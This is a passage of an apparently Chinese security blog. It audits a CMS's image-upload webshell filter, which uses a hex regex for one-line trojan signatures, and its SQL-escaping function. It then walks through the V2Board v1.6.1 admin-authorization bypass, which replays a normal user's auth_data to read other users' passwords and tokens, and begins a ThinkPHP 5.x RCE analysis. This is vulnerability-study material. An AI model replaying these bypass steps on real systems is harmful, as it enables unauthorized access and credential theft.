+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sys/apps/controllers/author/Chapter.php</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;upload-&gt;<span class="title function_ invoke__">do_upload</span>(<span class="string">&#x27;image&#x27;</span>))&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="variable language_">$this</span>-&gt;upload-&gt;<span class="title function_ invoke__">display_errors</span>();</span><br><span class="line">            <span class="title function_ invoke__">get_json</span>(<span class="variable">$msg</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$arr</span> = <span class="variable language_">$this</span>-&gt;upload-&gt;<span class="title function_ invoke__">data</span>();</span><br><span class="line">            <span class="variable">$img_path_file</span> = <span class="variable">$arr</span>[<span class="string">&#x27;full_path&#x27;</span>];</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">checkPicHex</span>(<span class="variable">$img_path_file</span>);</span><br><span class="line">           <span class="comment">/*关键在这里，让对我们上传图片的内容进行了检查导致无法上传*/</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span> == <span class="number">1</span>) <span class="title function_ invoke__">get_json</span>(<span class="string">&#x27;非法图片&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>跟进函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sys/apps/helpers/common_helper.php</span></span><br><span class="line"><span class="comment">//检查上传图片是否包含木马</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkPicHex</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="variable">$resource</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file</span>,<span class="string">&#x27;rb&#x27;</span>);</span><br><span class="line">        <span class="variable">$fileSize</span> = <span class="title function_ invoke__">filesize</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="title function_ invoke__">fseek</span>(<span class="variable">$resource</span>, <span class="number">0</span>);<span class="comment">//把文件指针移到文件的开头</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$fileSize</span> &gt; <span class="number">512</span>)&#123; <span class="comment">// 若文件大于521B文件取头和尾</span></span><br><span class="line">            <span class="variable">$hexCode</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">fread</span>(<span class="variable">$resource</span>, <span class="number">512</span>));</span><br><span class="line">            <span class="comment">/*fread —二进制安全文件读取*/</span></span><br><span class="line">            <span class="title function_ invoke__">fseek</span>(<span class="variable">$resource</span>, <span class="variable">$fileSize</span> - <span class="number">512</span>);<span class="comment">//把文件指针移到文件尾部</span></span><br><span class="line">            <span class="variable">$hexCode</span> .= <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">fread</span>(<span class="variable">$resource</span>,<span class="number">512</span>));</span><br><span class="line">            <span class="comment">/*bin2hex —将二进制数据转换为十六进制表示*/</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// 取全部</span></span><br><span class="line">            <span class="variable">$hexCode</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">fread</span>(<span class="variable">$resource</span>, <span class="variable">$fileSize</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$resource</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/(3c25.*?28.*?29.*?253e)|(3c3f.*?28.*?29.*?3f3e)|(3C534352495054)|(2F5343524950543E)|(3C736372697074)|(2F7363726970743E)/is&quot;</span>,<span class="variable">$hexCode</span>))</span><br><span class="line">        <span class="comment">/*匹配16进制中一句话木马中特征编码</span></span><br><span class="line"><span class="comment">        过滤</span></span><br><span class="line"><span class="comment">        &lt;%()%&gt;</span></span><br><span class="line"><span class="comment">        &lt;?()?&gt;</span></span><br><span class="line"><span class="comment">        &lt;script&gt;()&lt;/script&gt;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        &#123;</span><br><span class="line">        	<span class="comment">//删除文件</span></span><br><span class="line">        	<span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*也就是把图片以二进制方式读取的数据再进行十六进制转化，最后进行正则匹配过滤，看来绕过确实不容易*/</span></span><br></pre></td></tr></table></figure>
+
+<p>正常上传图片，</p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221122152819257.png"><img src="/CMS-Test/image-20221122152819257.png" alt="image-20221122152819257"></a></p>
+<p>成功</p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221122154113084.png"><img src="/CMS-Test/image-20221122154113084.png" alt="image-20221122154113084"></a></p>
+<p>而且还回显了图片上传的路径</p>
+<p>试试能不能访问</p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221122162549084.png"><img src="/CMS-Test/image-20221122162549084.png" alt="image-20221122162549084"></a></p>
+<p>发现是可以访问这个目录下的图片文件的</p>
+<p>但当我在这个路径目录直接放了脚本文件，再访问时</p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221122165943218.png"><img src="/CMS-Test/image-20221122165943218.png" alt="image-20221122165943218"></a></p>
+<p>发现被阻止了，也就是<code>apchae</code>在这个<strong>图片存储目录设置了脚本文件的访问权限禁止，那么就无法利用在这个目录下的脚本文件</strong></p>
+<p>所以，要么修改上传的路径，比如到网站的自身脚本目录下，进行访问执行</p>
+<hr>
+<h5 id="小说"><a href="#小说" class="headerlink" title="小说"></a>小说</h5><p>抓包小说，发现绕过了字数过少的限制，而且也绕过了小说后台审核</p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221122222054711.png"><img src="/CMS-Test/image-20221122222054711.png" alt="image-20221122222054711"></a></p>
+<p>我们抓包修改的内容没有经过后台直接到了存储目录</p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221122222413963.png"><img src="/CMS-Test/image-20221122222413963.png" alt="image-20221122222413963"></a></p>
+<p>后面发现是由于源码中，对签约用户自动审核通过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sys/apps/controllers/author/Bookchapter.php</span></span><br><span class="line">            <span class="comment">//判断签约，签约用户自动审核</span></span><br><span class="line">            <span class="variable">$signing</span> = <span class="title function_ invoke__">getzd</span>(<span class="string">&#x27;user&#x27;</span>,<span class="string">&#x27;signing&#x27;</span>,<span class="variable">$uid</span>);</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;yid&#x27;</span>] = <span class="variable">$signing</span> == <span class="number">1</span> ? <span class="number">0</span> : <span class="number">1</span>;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;bid&#x27;</span>] = <span class="variable">$bid</span>;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;addtime&#x27;</span>] = <span class="title function_ invoke__">time</span>();</span><br></pre></td></tr></table></figure>
+
+<p>其中主要对动漫和小说名字，以及评论处还进行了<code>sql</code>注入限制</p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221123201716429.png"><img src="/CMS-Test/image-20221123201716429.png" alt="image-20221123201716429"></a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sys/apps/helpers/common_helper.php</span></span><br><span class="line"><span class="comment">//SQL过滤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_replace</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$string</span>)) &#123;</span><br><span class="line">		<span class="keyword">foreach</span>(<span class="variable">$string</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">			<span class="variable">$string</span>[<span class="title function_ invoke__">safe_replace</span>(<span class="variable">$k</span>)] = <span class="title function_ invoke__">safe_replace</span>(<span class="variable">$v</span>); </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$string</span>))&#123;</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;%20&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;%27&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;%2527&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;&amp;#039;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;&amp;lt;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;&amp;gt;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;\%&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_encode</span>(<span class="variable">$string</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>也对一定时间内更新数也有限制，所以如果想利用签约作者账号爆库还是有点难</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sys/apps/controllers/author/Bookchapter.php   </span></span><br><span class="line">           <span class="comment">//判断五分钟内更新数量</span></span><br><span class="line">           <span class="variable">$time</span> = <span class="title function_ invoke__">time</span>()-<span class="number">300</span>;</span><br><span class="line">           <span class="variable">$mnum</span> = <span class="variable language_">$this</span>-&gt;mcdb-&gt;<span class="title function_ invoke__">get_nums</span>(<span class="variable">$table</span>,<span class="keyword">array</span>(<span class="string">&#x27;bid&#x27;</span>=&gt;<span class="variable">$bid</span>,<span class="string">&#x27;addtime&gt;&#x27;</span>=&gt;<span class="variable">$time</span>));</span><br><span class="line">           <span class="keyword">if</span>(<span class="variable">$mnum</span> &gt; <span class="number">5</span>) <span class="title function_ invoke__">get_json</span>(<span class="string">&#x27;系统检测到你有非法暴库行为~！&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221123123229249.png"><img src="/CMS-Test/image-20221123123229249.png" alt="image-20221123123229249"></a></p>
+<p>但是其对上传文件进行都默认为<code>txt</code>文件</p>
+<p>而且对类似<code>&lt;&gt;</code>特殊符号也进行了编译</p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221124133546733.png"><img src="/CMS-Test/image-20221124133546733.png" alt="image-20221124133546733"></a></p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221124133558480.png"><img src="/CMS-Test/image-20221124133558480.png" alt="image-20221124133558480"></a></p>
+<p>稍微看看小说文本文件生成的代码流程</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sys/apps/controllers/author/Bookchapter.php</span></span><br><span class="line">        <span class="comment">//写入小说到TXT文本</span></span><br><span class="line">        <span class="title function_ invoke__">get_book_txt</span>(<span class="variable">$bid</span>,<span class="variable">$id</span>,<span class="variable">$text</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$arr</span>[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&#x27;恭喜您，操作成功~!&#x27;</span>;</span><br><span class="line">        <span class="variable">$arr</span>[<span class="string">&#x27;url&#x27;</span>] = <span class="title function_ invoke__">get_url</span>(<span class="string">&#x27;author/bookchapter/index/&#x27;</span>.<span class="variable">$bid</span>);</span><br><span class="line">        <span class="title function_ invoke__">get_json</span>(<span class="variable">$arr</span>,<span class="number">1</span>);</span><br><span class="line"><span class="comment">/*这是把作者文章写入存储目录的代码*/</span></span><br></pre></td></tr></table></figure>
+
+<p>跟进 <code>get_book_txt</code>函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sys/apps/helpers/common_helper.php</span></span><br><span class="line"><span class="comment">//获取小说txt文本</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_book_txt</span>(<span class="params"><span class="variable">$bid</span>,<span class="variable">$zid</span>,<span class="variable">$text</span>=<span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$txt_file</span> = FCPATH.<span class="string">&#x27;caches/txt/&#x27;</span>.<span class="variable">$bid</span>.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$zid</span>.Mc_Book_Key).<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">    <span class="comment">/*这里修改了文本名字*/</span></span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$text</span>))&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">write_file</span>(<span class="variable">$txt_file</span>, <span class="variable">$text</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$txt_file</span>)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="comment">/*这里就是对改文章是否重复的判断*/</span></span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$txt_file</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>再跟进<code>write_file</code>函数</p>
+<p>看看我们的文本是怎么写入文件的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//写文件</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write_file</span>(<span class="params"><span class="variable">$path</span>, <span class="variable">$data</span>, <span class="variable">$mode</span> = FOPEN_WRITE_CREATE_DESTRUCTIVE</span>)</span>&#123;</span><br><span class="line">	<span class="variable">$dir</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$path</span>);</span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$dir</span>)) <span class="title function_ invoke__">mkdirss</span>(<span class="variable">$dir</span>);</span><br><span class="line">	<span class="keyword">if</span>(!<span class="variable">$fp</span> = @<span class="title function_ invoke__">fopen</span>(<span class="variable">$path</span>,<span class="variable">$mode</span>)) <span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">	<span class="title function_ invoke__">flock</span>(<span class="variable">$fp</span>, LOCK_EX);</span><br><span class="line">	<span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$data</span>);</span><br><span class="line">	<span class="title function_ invoke__">flock</span>(<span class="variable">$fp</span>, LOCK_UN);</span><br><span class="line">	<span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">TRUE</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>原来是直接用<code>fwrite</code>写入文件，而字符开始就被<code>html</code>转义了，所以写入的结果肯定是转义后的结果</p>
+<h4 id="猜测"><a href="#猜测" class="headerlink" title="猜测"></a>猜测</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可能是存在参数变量可以被代码执行函数覆盖，再通过与其他参数结合，实现命令执行</span><br></pre></td></tr></table></figure>
+
+<p>测试完成</p>
+<h1 id="V2Board-v1-6-1-越权访问漏洞"><a href="#V2Board-v1-6-1-越权访问漏洞" class="headerlink" title="V2Board  v1.6.1 越权访问漏洞"></a>V2Board  v1.6.1 越权访问漏洞</h1><p>这是在某次比赛遇到的一道题，只拿了题目专门来记录这个漏洞，并没下载代码测试</p>
+<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a><strong>漏洞描述</strong></h2><p><code>V2board</code>面板 <code>Admin.php</code> 存在越权访问漏洞，由于部分鉴权代码于<code>v1.6.1</code>版本进行了修改，鉴权方式变为从<code>Redis</code>中获取缓存判定是否存在可以调用接口，导致任意用户都可以调用管理员权限的接口获取后台权限</p>
+<p>也就是说它是从缓存中来判断权限，一旦判断成功，就可以以<code>admin</code>身份去访问其他不可访问的敏感内容，比如<code>admin</code>的密码等等</p>
+<h2 id="漏洞代码分析"><a href="#漏洞代码分析" class="headerlink" title="漏洞代码分析"></a>漏洞代码分析</h2><p>代码位置：<code>app/Http/Middleware/Admin.php</code></p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20230113161644874.png"><img src="/CMS-Test/image-20230113161644874.png" alt="image-20230113161644874"></a></p>
+<p>这里的代码就是判断<code>redis</code>缓存中是否存在<code>authorization</code>，如果存在就允许调用<code>admin</code>的接口，所以一旦存在</p>
+<p><code>authorization</code>就可以调用该接口，但是并没用进一步判断<code>authorization</code>中是否属于<code>admin</code></p>
+<p>主要要通过两次逻辑实现验证，一个是存在 <code>header</code> 中的 <code>authorization</code> 参数，再一个是校验 <code>authorizations</code> 是否存在于<code>Redis</code>缓存中的</p>
+<p>在返回包数据中，</p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20230113165445597.png"><img src="/CMS-Test/image-20230113165445597.png" alt="image-20230113165445597"></a></p>
+<p>这里可以看到，这里在登录时会返回<code>token</code>，<code>auth_data</code></p>
+<p>而<code>auth_data</code>和<code>authorization</code>两个格式都是一样的<code>base64_encode(&quot;username:password&quot;)</code></p>
+<p>但是一个普通用户，一个管理员用户，这里就可能存在逻辑漏洞越权</p>
+<h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><p>先进行注册一个普通权限的</p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20230113161201687.png"><img src="/CMS-Test/image-20230113161201687.png" alt="image-20230113161201687"></a></p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">账号：<span class="symbol">123@</span>qq.com</span><br><span class="line">密码：<span class="number">123456789</span></span><br></pre></td></tr></table></figure>
+
+<p>在登录时进行抓包</p>
+<p>返回包会返回我们的<code>token</code>和<code>auth_data</code></p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20230113165230066.png"><img src="/CMS-Test/image-20230113165230066.png" alt="image-20230113165230066"></a></p>
+<p>同时 <code>auth_data</code> 会缓存于 <code>Redis</code> 中</p>
+<p>但是还是需要把这个<code>auth_data</code>写进<code>authorization</code></p>
+<p>如果不写入直接访问<code>/admin</code>就会弹出禁止，因为在缓存中普通用户的数据是以<code>auth_data</code>，</p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20230113171237926.png"><img src="/CMS-Test/image-20230113171237926.png" alt="image-20230113171237926"></a></p>
+<p>所以通过下面访问<code>/api/v1/user/info</code>，当然访问其他位置也可以，只要能把<code>authorization</code>参数把普通用户数据添加到请求体中，并且成功发送</p>
+<p>从而普通用户的数据也以<code>authorization</code>参数形式保存到<code>redis</code>缓存中去了</p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20230113172957033.png"><img src="/CMS-Test/image-20230113172957033.png" alt="image-20230113172957033"></a></p>
+<p>如何我们就可以访问<code>admin</code>才可以访问的信息</p>
+<p>比如<code>/api/v1/admin/user/fetch</code>，这就是以<code>admin</code>查看访问<code>user</code>的信息</p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20230113180827350.png"><img src="/CMS-Test/image-20230113180827350.png" alt="image-20230113180827350"></a></p>
+<p>成功访问</p>
+<p>并且得到<code>email</code>,<code>password</code>,<code>token</code>等信息</p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20230113180921938.png"><img src="/CMS-Test/image-20230113180921938.png" alt="image-20230113180921938"></a></p>
+<p>测试完成</p>
+<h1 id="ThinkPHP-5-x-远程命令执行漏洞"><a href="#ThinkPHP-5-x-远程命令执行漏洞" class="headerlink" title="ThinkPHP 5.x 远程命令执行漏洞"></a>ThinkPHP 5.x 远程命令执行漏洞</h1><blockquote>
+<p>好老的洞，最近在一个学弟发的题目中看的，虽然做出了，但是<code>thinkphp</code>做的太少了还是的找点来打打(审Java才是正道</p>
+</blockquote>
+<h2 id="漏洞影响范围"><a href="#漏洞影响范围" class="headerlink" title="漏洞影响范围"></a>漏洞影响范围</h2><blockquote>
+<p>5.x &lt; 5.1.31</p>
+<p>5.x &gt;&#x3D; 5.0.23</p>
+</blockquote>
+<h2 id="漏洞复现环境"><a href="#漏洞复现环境" class="headerlink" title="漏洞复现环境"></a>漏洞复现环境</h2><blockquote>
+<p>thinkphp ：V5.1.29</p>
+<p>Apache：V2.4.39</p>
+<p>php：V5.6.9nts</p>
+</blockquote>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20231009164442382.png"><img src="/CMS-Test/image-20231009164442382.png" alt="image-20231009164442382"></a></p>
+<h2 id="漏洞代码分析-1"><a href="#漏洞代码分析-1" class="headerlink" title="漏洞代码分析"></a>漏洞代码分析</h2><p>先看官方更新补丁，</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815">5.1.x修复</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/top-think/framework/commit/b797d72352e6b4eb0e11b6bc2a2ef25907b7756f">5.0.x修复</a></p>
+<p>两者修复区别不大，<code>5.1.x</code>只有比<code>5.0.x</code>多了有如下图的<code>70line</code>的那行代码</p>
+</blockquote>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20231009162634591.png"><img src="/CMS-Test/image-20231009162634591.png" alt="image-20231009162634591"></a></p>
+<p>可以看到修复后的代码对<code>controller</code>进行了严格过滤，而在之前的代码中是直接读取控制器名字，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$controller</span>       = <span class="title function_ invoke__">strip_tags</span>(<span class="variable">$result</span>[<span class="number">1</span>] ?: <span class="variable">$this</span>-&gt;rule-&gt;<span class="title function_ invoke__">getConfig</span>(<span class="string">&#x27;default_controller&#x27;</span>));</span><br></pre></td></tr></table></figure>
+
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20231009170933411.png"><img src="/CMS-Test/image-20231009170933411.png" alt="image-20231009170933411"></a></p>
+<p>既然这么严格 过滤，所以猜测<code>$controller</code>就是命令执行漏洞的关键或者是命令执行函数的参数，全局查找命令执行执行函数的位置</p>
+<p>正好就在同一个文件中，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 监听module_init</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;app[<span class="string">&#x27;hook&#x27;</span>]-&gt;<span class="title function_ invoke__">listen</span>(<span class="string">&#x27;module_init&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 实例化控制器</span></span><br><span class="line">            <span class="variable">$instance</span> = <span class="variable language_">$this</span>-&gt;app-&gt;<span class="title function_ invoke__">controller</span>(<span class="variable">$this</span>-&gt;controller,</span><br><span class="line">                <span class="variable">$this</span>-&gt;rule-&gt;<span class="title function_ invoke__">getConfig</span>(<span 